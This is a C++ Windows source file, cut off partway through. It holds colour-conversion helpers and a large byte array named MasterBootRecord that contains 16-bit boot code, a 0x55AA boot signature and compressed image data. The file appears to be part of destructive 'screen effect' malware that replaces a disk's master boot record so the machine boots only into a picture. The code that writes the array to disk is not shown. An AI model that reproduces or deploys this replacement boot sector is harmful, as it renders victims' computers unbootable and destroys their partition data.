#include <windows.h>
#include <iostream>
#include <cmath>
#include <cstdlib>
#include <ctime>
#define _USE_MATH_DEFINES 1
#pragma comment(lib, "winmm.lib")

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE unused;
    };
} *PRGBQUAD;

typedef struct {
    double h;
    double s;
    double l;
} HSL;

typedef struct {
    BYTE rgbBlue;
    BYTE rgbGreen;
    BYTE rgbRed;
    BYTE rgbReserved;
} MY_RGBQUAD;

namespace Colors {
    double hueToRGB(double p, double q, double t) {
        if (t < 0) t += 1;
        if (t > 1) t -= 1;
        if (t < 1/6.0) return p + (q - p) * 6 * t;
        if (t < 1/2.0) return q;
        if (t < 2/3.0) return p + (q - p) * (2/3.0 - t) * 6;
        return p;
    }
    
    HSL rgb2hsl(RGBQUAD color) {
        HSL hsl;
        double r = color.rgbRed / 255.0;
        double g = color.rgbGreen / 255.0;
        double b = color.rgbBlue / 255.0;
        
        double max = fmax(fmax(r, g), b);
        double min = fmin(fmin(r, g), b);
        double delta = max - min;
        
        hsl.l = (max + min) / 2;
        
        if (delta == 0) {
            hsl.h = 0;
            hsl.s = 0;
        } else {
            hsl.s = hsl.l < 0.5 ? delta / (max + min) : delta / (2 - max - min);
            
            if (max == r)
                hsl.h = (g - b) / delta + (g < b ? 6 : 0);
            else if (max == g)
                hsl.h = (b - r) / delta + 2;
            else if (max == b)
                hsl.h = (r - g) / delta + 4;
            
            hsl.h /= 6;
        }
        
        return hsl;
    }
    
    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        double r, g, b;
        
        if (hsl.s == 0) {
            r = g = b = hsl.l;
        } else {
            double q = hsl.l < 0.5 ? hsl.l * (1 + hsl.s) : hsl.l + hsl.s - hsl.l * hsl.s;
            double p = 2 * hsl.l - q;
            
            r = hueToRGB(p, q, hsl.h + 1/3.0);
            g = hueToRGB(p, q, hsl.h);
            b = hueToRGB(p, q, hsl.h - 1/3.0);
        }
        
        rgb.rgbRed = (BYTE)(r * 255);
        rgb.rgbGreen = (BYTE)(g * 255);
        rgb.rgbBlue = (BYTE)(b * 255);
        rgb.rgbReserved = 0;
        
        return rgb;
    }
}
COLORREF Hue(int hue) {
    HSL hsl;
    hsl.h = hue / 360.0;
    hsl.s = 1.0;
    hsl.l = 0.5;
    RGBQUAD rgb = Colors::hsl2rgb(hsl);
    return RGB(rgb.rgbRed, rgb.rgbGreen, rgb.rgbBlue);
}

const unsigned char MasterBootRecord[] = { 0xBB, 0xE0, 0x07, 0x8E, 0xC3, 0x8E, 0xDB, 0xB8, 0x16, 0x02, 0xB9, 0x03, 0x00, 0xB6, 0x00, 0xBB,
0x00, 0x00, 0xCD, 0x13, 0x31, 0xC0, 0x89, 0xC3, 0x89, 0xC1, 0x89, 0xC2, 0xBE, 0x00, 0x00, 0xBF,
0x84, 0x2A, 0xAC, 0x81, 0xFE, 0x84, 0x2A, 0x73, 0x31, 0x3C, 0x80, 0x73, 0x02, 0xEB, 0x0F, 0x24,
0x7F, 0x88, 0xC1, 0xAC, 0xAA, 0xFE, 0xC9, 0x80, 0xF9, 0xFF, 0x75, 0xF7, 0xEB, 0xE4, 0xB4, 0x00,
0x3C, 0x40, 0x72, 0x05, 0x24, 0x3F, 0x88, 0xC4, 0xAC, 0x89, 0xC1, 0xAD, 0x89, 0xF2, 0x89, 0xFE,
0x29, 0xC6, 0xAC, 0xAA, 0xE2, 0xFC, 0x89, 0xD6, 0xEB, 0xC8, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xBB,
0xE0, 0x07, 0x8E, 0xDB, 0xBE, 0x84, 0x2A, 0xB4, 0x00, 0xAC, 0xBB, 0x00, 0x00, 0x89, 0xC1, 0xBA,
0xC8, 0x03, 0x88, 0xD8, 0xEE, 0x43, 0xBA, 0xC9, 0x03, 0xAC, 0xEE, 0xAC, 0xEE, 0xAC, 0xEE, 0xE2,
0xEE, 0xBB, 0x00, 0xA0, 0x8E, 0xC3, 0xBF, 0x00, 0x00, 0xB9, 0x00, 0x7D, 0xF3, 0xA5, 0xF4, 0xB4,
0x86, 0xB9, 0x32, 0x00, 0xCD, 0x15, 0xEB, 0xF6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA,
0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x8F, 0x0C, 0x30, 0x30, 0x30, 0x3F, 0x3F, 0x3F, 0x20, 0x20, 0x20, 0x00, 0x00, 0x00, 0x20, 0x00,
0x00, 0x07, 0x08, 0x00, 0x05, 0x0A, 0x00, 0x84, 0x3F, 0x00, 0x00, 0x3F, 0x3F, 0x04, 0x0D, 0x00,
0x83, 0x01, 0x01, 0x01, 0x01, 0x04, 0x04, 0x00, 0x08, 0x08, 0x00, 0x10, 0x10, 0x00, 0x20, 0x20,
0x00, 0x40, 0x40, 0x40, 0x00, 0x40, 0x80, 0x80, 0x00, 0x2F, 0x2F, 0x00, 0x81, 0x00, 0x00, 0x41,
0x2F, 0x31, 0x01, 0x41, 0x2F, 0x2F, 0x01, 0x41, 0x68, 0x68, 0x01, 0x41, 0x44, 0xC7, 0x03, 0x41,
0x40, 0x44, 0x01, 0x41, 0x3A, 0x4C, 0x06, 0x08, 0x39, 0x01, 0x41, 0x3B, 0x42, 0x01, 0x83, 0x00,
0x00, 0x00, 0x00, 0x41, 0x35, 0x40, 0x01, 0x06, 0x33, 0x01, 0x05, 0x40, 0x01, 0x05, 0x44, 0x01,
0x41, 0x31, 0xED, 0x05, 0x05, 0x4A, 0x00, 0x08, 0x80, 0x02, 0x40, 0x93, 0x40, 0x01, 0x80, 0x03,
0x40, 0x58, 0x71, 0x03, 0x40, 0x4A, 0x6F, 0x03, 0x06, 0x3B, 0x01, 0x40, 0xED, 0x80, 0x02, 0x05,
0x38, 0x02, 0x40, 0x47, 0xEE, 0x00, 0x09, 0xBD, 0x03, 0x40, 0xE7, 0x40, 0x01, 0x04, 0x3A, 0x01,
0x40, 0x4F, 0xEE, 0x00, 0x07, 0xCF, 0x02, 0x40, 0xEB, 0x80, 0x02, 0x40, 0x45, 0x40, 0x01, 0x05,
0x42, 0x00, 0x06, 0x8F, 0x01, 0x07, 0x53, 0x00, 0x40, 0x8D, 0xED, 0x04, 0x04, 0x0E, 0x00, 0x83,
0x03, 0x01, 0x03, 0x03, 0x37, 0x03, 0x05, 0x0D, 0xCD, 0x00, 0x09, 0xE1, 0x00, 0x06, 0x26, 0x02,
0x07, 0x3F, 0x01, 0x40, 0x46, 0x44, 0x01, 0x40, 0x96, 0xC0, 0x03, 0x05, 0x36, 0x01, 0x80, 0x03,
0x05, 0x40, 0x01, 0x37, 0x42, 0x01, 0x08, 0x34, 0x01, 0x0A, 0x2C, 0x01, 0x07, 0x28, 0x07, 0x0B,
0xEE, 0x0A, 0x07, 0x42, 0x02, 0x40, 0x46, 0xFE, 0x04, 0x40, 0x83, 0x40, 0x01, 0x06, 0x36, 0x01,
0x0A, 0x0D, 0x00, 0x80, 0x03, 0x35, 0x82, 0x07, 0x08, 0x68, 0x02, 0x08, 0xD3, 0x00, 0x0E, 0xE5,
0x00, 0x11, 0xA9, 0x04, 0x3A, 0xF8, 0x00, 0x0B, 0x39, 0x01, 0x40, 0x82, 0x40, 0x01, 0x80, 0x03,
0x09, 0x2E, 0x01, 0x05, 0x71, 0x02, 0x05, 0x0F, 0x00, 0x2B, 0x3E, 0x01, 0x0B, 0xBD, 0x00, 0x0D,
0x35, 0x01, 0x14, 0x40, 0x01, 0x0C, 0x27, 0x00, 0x07, 0x00, 0x06, 0x3F, 0xE2, 0x02, 0x40, 0x82,
0x40, 0x01, 0x05, 0x2E, 0x01, 0x09, 0x39, 0x01, 0x05, 0xBA, 0x03, 0x06, 0x10, 0x00, 0x35, 0xD6,
0x05, 0x0D, 0x95, 0x09, 0x0A, 0xE1, 0x00, 0x08, 0x51, 0x01, 0x05, 0xFD, 0x00, 0x0D, 0x78, 0x03,
0x17, 0xFD, 0x00, 0x22, 0x13, 0x01, 0x0F, 0x48, 0x00, 0x40, 0x7A, 0x40, 0x01, 0x04, 0x38, 0x01,
0x07, 0x30, 0x01, 0x04, 0x38, 0x01, 0x0A, 0x8F, 0x02, 0x30, 0x46, 0x0D, 0x0F, 0x6F, 0x02, 0x10,
0x7E, 0x02, 0x12, 0x29, 0x00, 0x3E, 0x3D, 0x07, 0x40, 0x85, 0x00, 0x05, 0x05, 0x25, 0x06, 0x06,
0x7F, 0x02, 0x07, 0x30, 0x06, 0x29, 0x3B, 0x01, 0x07, 0x87, 0x03, 0x0A, 0x85, 0x04, 0x0B, 0xE8,
0x04, 0x15, 0x41, 0x01, 0x0E, 0x0B, 0x05, 0x07, 0x41, 0x01, 0x37, 0x49, 0x06, 0x40, 0x83, 0x80,
0x07, 0x07, 0x62, 0x07, 0x05, 0x40, 0x01, 0x05, 0x0B, 0x00, 0x08, 0x7A, 0x02, 0x2B, 0xBD, 0x03,
0x08, 0x83, 0x03, 0x27, 0x84, 0x02, 0x13, 0x82, 0x02, 0x32, 0x19, 0x0F, 0x11, 0x19, 0x04, 0x40,
0x7C, 0x40, 0x01, 0x07, 0xA9, 0x08, 0x06, 0x07, 0x00, 0x09, 0xF8, 0x04, 0x1F, 0x42, 0x01, 0x08,
0x08, 0x06, 0x1A, 0x6C, 0x02, 0x2B, 0x40, 0x01, 0x0B, 0xAF, 0x07, 0x35, 0x7C, 0x11, 0x40, 0x6D,
0x40, 0x01, 0x80, 0x03, 0x0F, 0x71, 0x00, 0x07, 0xF1, 0x04, 0x07, 0x8A, 0x02, 0x1D, 0xF2, 0x09,
0x09, 0x35, 0x01, 0x0C, 0x49, 0x0C, 0x3E, 0x3E, 0x01, 0x0D, 0x82, 0x02, 0x07, 0x4C, 0x01, 0x26,
0xBA, 0x01, 0x40, 0x73, 0x00, 0x0A, 0x88, 0x00, 0x00, 0x02, 0x02, 0x02, 0x08, 0x08, 0x08, 0x08,
0x04, 0x04, 0x00, 0x84, 0x08, 0x08, 0x02, 0x02, 0x02, 0x04, 0x79, 0x00, 0x07, 0xF3, 0x04, 0x09,
0x3A, 0x01, 0x19, 0x42, 0x01, 0x08, 0xA5, 0x00, 0x0A, 0x36, 0x01, 0x40, 0x44, 0x3E, 0x01, 0x0E,
0x4D, 0x06, 0x0A, 0x4F, 0x06, 0x21, 0x15, 0x01, 0x40, 0x6F, 0x40, 0x01, 0x81, 0x00, 0x00, 0x05,
0x3B, 0x01, 0x80, 0x06, 0x04, 0x04, 0x00, 0x84, 0x08, 0x06, 0x06, 0x06, 0x06, 0x04, 0x04, 0x00,
0x04, 0x0E, 0x00, 0x83, 0x02, 0x02, 0x00, 0x03, 0x0D, 0x7F, 0x00, 0x15, 0x40, 0x01, 0x0E, 0x18,
0x02, 0x16, 0xDE, 0x09, 0x40, 0x41, 0x40, 0x01, 0x0C, 0x49, 0x01, 0x08, 0x1C, 0x04, 0x12, 0x73,
0x0B, 0x15, 0xB7, 0x01, 0x40, 0x61, 0xB6, 0x03, 0x07, 0x75, 0x02, 0x09, 0x3A, 0x01, 0x09, 0x09,
0x00, 0x05, 0x45, 0x01, 0x05, 0x8D, 0x02, 0x04, 0x8F, 0x02, 0x80, 0x00, 0x13, 0x3E, 0x01, 0x07,
0x11, 0x02, 0x0E, 0x98, 0x0D, 0x28, 0xAD, 0x08, 0x80, 0x03, 0x3E, 0xA7, 0x02, 0x12, 0x88, 0x02,
0x0A, 0xA8, 0x02, 0x40, 0x6A, 0x40, 0x01, 0x80, 0x03, 0x1B, 0x3E, 0x01, 0x0B, 0x45, 0x01, 0x05,
0x9C, 0x02, 0x80, 0x02, 0x14, 0xC1, 0x03, 0x09, 0xE6, 0x15, 0x26, 0xB6, 0x03, 0x13, 0x5D, 0x03,
0x36, 0xEF, 0x03, 0x12, 0x86, 0x00, 0x15, 0xB4, 0x06, 0x40, 0x60, 0xBC, 0x03, 0x20, 0x3D, 0x01,
0x0C, 0x43, 0x01, 0x82, 0x06, 0x08, 0x08, 0x05, 0x18, 0x05, 0x04, 0xA4, 0x00, 0x08, 0x4A, 0x01,
0x0A, 0x4C, 0x03, 0x2C, 0x07, 0x01, 0x12, 0x29, 0x07, 0x06, 0x3E, 0x02, 0x05, 0x56, 0x00, 0x35,
0x42, 0x01, 0x0C, 0x1B, 0x05, 0x40, 0x6A, 0x40, 0x01, 0x04, 0x3F, 0x01, 0x10, 0x2C, 0x01, 0x83,
0x03, 0x06, 0x06, 0x03, 0x1C, 0x43, 0x01, 0x87, 0x08, 0x08, 0x02, 0x08, 0x06, 0x06, 0x08, 0x02,
0x09, 0x95, 0x0D, 0x36, 0xC9, 0x04, 0x04, 0x2E, 0x01, 0x09, 0xCF, 0x02, 0x0B, 0xE8, 0x00, 0x80,
0x03, 0x13, 0x83, 0x03, 0x24, 0x22, 0x0A, 0x13, 0x7D, 0x02, 0x09, 0x3B, 0x0D, 0x40, 0x6C, 0x3F,
0x01, 0x09, 0x47, 0x01, 0x80, 0x03, 0x12, 0x46, 0x01, 0x0C, 0xEB, 0x03, 0x80, 0x08, 0x2C, 0xDF,
0x09, 0x08, 0x1B, 0x09, 0x04, 0xB7, 0x02, 0x05, 0x67, 0x02, 0x06, 0x93, 0x0B, 0x08, 0x68, 0x0A,
0x0B, 0xDD, 0x11, 0x09, 0x93, 0x01, 0x1B, 0x7A, 0x0B, 0x11, 0xE0, 0x09, 0x0A, 0xEE, 0x1D, 0x12,
0xE6, 0x02, 0x40, 0x5B, 0x82, 0x02, 0x12, 0x3F, 0x01, 0x0E, 0x0F, 0x00, 0x18, 0x43, 0x01, 0x06,
0x0A, 0x00, 0x05, 0x54, 0x06, 0x2B, 0x7B, 0x02, 0x07, 0x28, 0x01, 0x81, 0x03, 0x01, 0x05, 0x0A,
0x00, 0x07, 0x39, 0x01, 0x08, 0x5B, 0x0A, 0x07, 0xE3, 0x11, 0x08, 0x4A, 0x01, 0x28, 0x0A, 0x04,
0x0A, 0x6C, 0x0A, 0x14, 0x0B, 0x03, 0x40, 0x5F, 0xC2, 0x21, 0x80, 0x00, 0x0C, 0xAF, 0x08, 0x06,
0xBE, 0x08, 0x22, 0x0A, 0x05, 0x0A, 0x42, 0x01, 0x80, 0x08, 0x04, 0x08, 0x01, 0x28, 0x3B, 0x01,
0x05, 0x38, 0x01, 0x80, 0x00, 0x08, 0xC9, 0x0C, 0x0D, 0x41, 0x01, 0x0A, 0x44, 0x01, 0x0F, 0x14,
0x00, 0x0B, 0x4F, 0x0A, 0x09, 0xA4, 0x06, 0x16, 0xA1, 0x08, 0x24, 0x62, 0x06, 0x40, 0x53, 0x7A,
0x07, 0x0E, 0x3D, 0x01, 0x23, 0x3B, 0x01, 0x0E, 0x2F, 0x00, 0x04, 0x1E, 0x0A, 0x1B, 0x41, 0x01,
0x08, 0x88, 0x03, 0x80, 0x03, 0x05, 0x3F, 0x01, 0x0C, 0xAE, 0x03, 0x10, 0x2A, 0x01, 0x15, 0x4F,
0x01, 0x0A, 0x0F, 0x05, 0x0A, 0x1C, 0x14, 0x06, 0x84, 0x15, 0x16, 0x27, 0x0B, 0x16, 0x40, 0x01,
0x40, 0x5A, 0x45, 0x01, 0x80, 0x00, 0x0D, 0x2B, 0x0B, 0x15, 0x29, 0x06, 0x0B, 0xC9, 0x03, 0x14,
0x42, 0x01, 0x06, 0x15, 0x0A, 0x1C, 0xA1, 0x04, 0x80, 0x01, 0x06, 0xA8, 0x07, 0x09, 0x41, 0x0F,
0x14, 0x7C, 0x02, 0x17, 0x54, 0x01, 0x09, 0xB6, 0x15, 0x0B, 0x38, 0x0E, 0x13, 0xEE, 0x09, 0x1C,
0x3D, 0x01, 0x04, 0xB9, 0x01, 0x39, 0xAA, 0x19, 0x21, 0x21, 0x00, 0x09, 0x1E, 0x01, 0x0B, 0x29,
0x01, 0x13, 0x3B, 0x01, 0x0B, 0x96, 0x07, 0x10, 0x42, 0x01, 0x04, 0x40, 0x01, 0x1E, 0x82, 0x02,
0x07, 0xF3, 0x00, 0x07, 0x06, 0x13, 0x28, 0x3C, 0x01, 0x05, 0x05, 0x00, 0x0D, 0x46, 0x02, 0x17,
0x06, 0x01, 0x1E, 0x12, 0x13, 0x05, 0xAF, 0x02, 0x40, 0x59, 0x40, 0x01, 0x80, 0x02, 0x0A, 0x08,
0x01, 0x0B, 0x3C, 0x01, 0x80, 0x06, 0x04, 0x26, 0x0B, 0x88, 0x07, 0x04, 0x04, 0x04, 0x02, 0x02,
0x07, 0x07, 0x07, 0x04, 0xA8, 0x08, 0x1C, 0xC6, 0x03, 0x1A, 0x81, 0x02, 0x05, 0x6A, 0x07, 0x08,
0x35, 0x06, 0x2D, 0x38, 0x01, 0x0B, 0x3E, 0x01, 0x80, 0x02, 0x07, 0x87, 0x0F, 0x1B, 0x06, 0x01,
0x1D, 0x3B, 0x04, 0x07, 0xF1, 0x02, 0x40, 0x5D, 0xBE, 0x03, 0x0D, 0x3E, 0x01, 0x85, 0x08, 0x06,
0x07, 0x02, 0x05, 0x07, 0x04, 0x3D, 0x01, 0x86, 0x03, 0x04, 0x02, 0x03, 0x03, 0x04, 0x04, 0x04,
0x49, 0x01, 0x13, 0x84, 0x07, 0x08, 0xAA, 0x07, 0x04, 0x41, 0x01, 0x14, 0x44, 0x06, 0x81, 0x01,
0x01, 0x05, 0x3E, 0x01, 0x08, 0xC3, 0x11, 0x32, 0x3E, 0x01, 0x82, 0x01, 0x00, 0x02, 0x09, 0x0D,
0x00, 0x80, 0x05, 0x07, 0x42, 0x01, 0x22, 0xA9, 0x17, 0x11, 0x3C, 0x06, 0x0D, 0x1C, 0x09, 0x40,
0x4D, 0x95, 0x17, 0x80, 0x00, 0x07, 0x38, 0x01, 0x07, 0x4A, 0x07, 0x08, 0xA2, 0x0D, 0x05, 0x7A,
0x02, 0x87, 0x04, 0x03, 0x04, 0x04, 0x03, 0x02, 0x04, 0x04, 0x04, 0x08, 0x00, 0x81, 0x02, 0x02,
0x05, 0x42, 0x01, 0x16, 0x50, 0x0B, 0x09, 0x41, 0x01, 0x04, 0x42, 0x01, 0x0B, 0x47, 0x01, 0x04,
0xD8, 0x0E, 0x80, 0x03, 0x08, 0xFE, 0x01, 0x33, 0x3D, 0x01, 0x0C, 0x3E, 0x01, 0x04, 0x04, 0x00,
0x04, 0x66, 0x00, 0x0C, 0x83, 0x02, 0x0B, 0x13, 0x01, 0x15, 0xC3, 0x0B, 0x09, 0x63, 0x10, 0x07,
0x78, 0x05, 0x40, 0x5F, 0x7E, 0x02, 0x0A, 0xDF, 0x0E, 0x05, 0x3A, 0x01, 0x05, 0x7B, 0x02, 0x04,
0x7C, 0x02, 0x04, 0x3C, 0x01, 0x04, 0x09, 0x00, 0x06, 0x08, 0x00, 0x13, 0x0A, 0x0A, 0x06, 0x82,
0x02, 0x11, 0xB3, 0x04, 0x05, 0x3F, 0x01, 0x21, 0x26, 0x01, 0x09, 0x09, 0x00, 0x08, 0x3C, 0x00,
0x05, 0x0C, 0x00, 0x04, 0x3D, 0x00, 0x81, 0x02, 0x05, 0x12, 0x2F, 0x00, 0x80, 0x02, 0x05, 0x82,
0x02, 0x10, 0x26, 0x0A, 0x17, 0xC8, 0x03, 0x0C, 0x02, 0x16, 0x40, 0x56, 0x40, 0x01, 0x0B, 0x3F,
0x01, 0x08, 0x53, 0x0C, 0x05, 0x7E, 0x02, 0x05, 0x39, 0x01, 0x0F, 0xBB, 0x00, 0x04, 0x89, 0x02,
0x05, 0x05, 0x00, 0x17, 0x41, 0x01, 0x0A, 0x0B, 0x01, 0x0A, 0x88, 0x02, 0x0F, 0x23, 0x0B, 0x19,
0x3F, 0x01, 0x06, 0x35, 0x01, 0x06, 0x0E, 0x00, 0x05, 0x8C, 0x06, 0x81, 0x02, 0x07, 0x17, 0x31,
0x00, 0x80, 0x08, 0x10, 0x4B, 0x05, 0x0D, 0x55, 0x06, 0x0F, 0x47, 0x06, 0x06, 0xF3, 0x08, 0x09,
0x39, 0x17, 0x40, 0x58, 0x3C, 0x06, 0x0B, 0x3F, 0x01, 0x04, 0x05, 0x00, 0x82, 0x07, 0x04, 0x02,
0x05, 0x7B, 0x02, 0x16, 0xC1, 0x00, 0x13, 0x40, 0x01, 0x0C, 0x04, 0x05, 0x08, 0x3F, 0x01, 0x86,
0x02, 0x05, 0x03, 0x05, 0x05, 0x08, 0x02, 0x19, 0xBA, 0x03, 0x07, 0x2D, 0x00, 0x06, 0x06, 0x00,
0x08, 0xFD, 0x03, 0x06, 0xBA, 0x02, 0x82, 0x03, 0x00, 0x00, 0x13, 0x7A, 0x02, 0x0A, 0x82, 0x02,
0x0C, 0xA9, 0x01, 0x09, 0x0E, 0x09, 0x14, 0x7F, 0x02, 0x09, 0x9F, 0x10, 0x40, 0x57, 0x80, 0x02,
0x07, 0xBE, 0x03, 0x0A, 0x3F, 0x01, 0x06, 0x06, 0x00, 0x80, 0x07, 0x08, 0x7B, 0x02, 0x10, 0x82,
0x02, 0x05, 0x13, 0x00, 0x14, 0x40, 0x01, 0x06, 0x41, 0x01, 0x0B, 0x40, 0x01, 0x09, 0x7F, 0x01,
